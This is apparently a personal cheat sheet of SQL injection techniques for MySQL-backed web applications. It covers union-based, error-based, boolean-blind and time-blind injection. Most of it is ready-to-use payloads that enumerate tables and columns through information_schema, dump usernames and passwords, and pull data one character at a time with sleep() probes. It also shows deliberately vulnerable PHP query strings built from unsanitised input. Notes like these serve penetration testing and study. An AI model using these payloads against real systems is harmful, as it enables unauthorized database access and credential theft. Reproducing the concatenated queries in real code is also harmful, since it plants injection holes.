**In-band SQLi (Classic SQLi)**
 - Error-based SQLi	(//echo)
 - Union-based SQLi	(echo)
 
**Inferential SQLi (Blind SQLi)**
 - Blind-based SQLi
	 - Boolean-based (content-based) Blind SQLi
	 - Time-based Blind SQLi

**Out-of-band SQLi**
[Out-of-band SQL Injection](https://www.acunetix.com/blog/articles/blind-out-of-band-sql-injection-vulnerability-testing-added-acumonitor/) is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results.

**In-band SQLi (Classic SQLi)** 
 - **Union based(echo)**
	 - users where id=0 or 1=1     
	 - testing numbers of columns with "order by"   
	 -	union select,database(),version()   


```
order by 
union select
group_concat(table_name) from information_schema.tables where table_schema=database()
group_concat(column_name) from information_schema.columns where table_name='table_name'
group_concat(data) from table_name
```
Example

    #Enumerating tables
	 -1 union select 1,2,3,concat(table_name) from information_schema.tables where table_schema=database()
	#Enumerating columns
	-1 union select 1,2,3,concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' 
	#Dump Data from Tables   
     -1 union select 1,2,3,concat(username,password) from users 

- **Error-based SQLi** 
```
# Intro 

SELECT count(*) from information_schema.tables;
SELECT rand();
SELECT floor(1.5);
select 1 from y;
select count(*),username from users group by username;

#Variable
SELECT count(*),CONCAT((SELECT @@version),0x3a,rand()) x FROM information_schema.tables group by x;
SELECT @x;
######
SELECT count(*),CONCAT((SELECT @@version),0x3a,floor(rand()*2)) x FROM information_schema.tables group by x;
SELECT @x;

# Version
AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)

# Table
AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)
```
       
**Inferential SQLi	 (Blind SQLi)**
  Change config (//mysqli_report(MYSQLI_REPORT_ERROR |
MYSQLI_REPORT_STRICT)) 

-	Boolean Based Blind(id=1 and 1=2) 
	-  `$sql ="SELECT * FROM users WHERE id="$uid""`
	- `$sql ="SELECT * FROM users WHERE id='$uid'"`
	- `$sql ="SELECT * FROM users WHERE id=('$uid')"`
```
# Intro
select substr('abcde',1,1);
select ascii('a');
select ascii(substr(@@version,1,1));

# True or False
select ascii(substr(@@version,1,1)) < 50;
select ascii(substr(@@version,1,1)) < 40;
select ascii(substr(@@version,1,1)) = 49;

# Testing
1 and 1=1 -> True
1 and 1=2 -> False

# Version
and ascii(substr(@@version,1,1)) = 49 -> First Character
and ascii(substring(version(),2,1)) = 48 -> Second Character

# Table
and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100
```
- Time Based Blind	(1 -sleep(5))
```
# Intro
SELECT IF(500<1000, "YES", "NO");
sleep(5);
and if(500<1000, sleep(5), NULL) -> Sleep
and if(500>1000, sleep(5), NULL) -> Do Not Sleep

# Version
and if(ascii(substr(version(),1,1)) = 49, sleep(5), NULL)

# Table
and if(ascii(substr((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100, sleep(5), NULL)

```


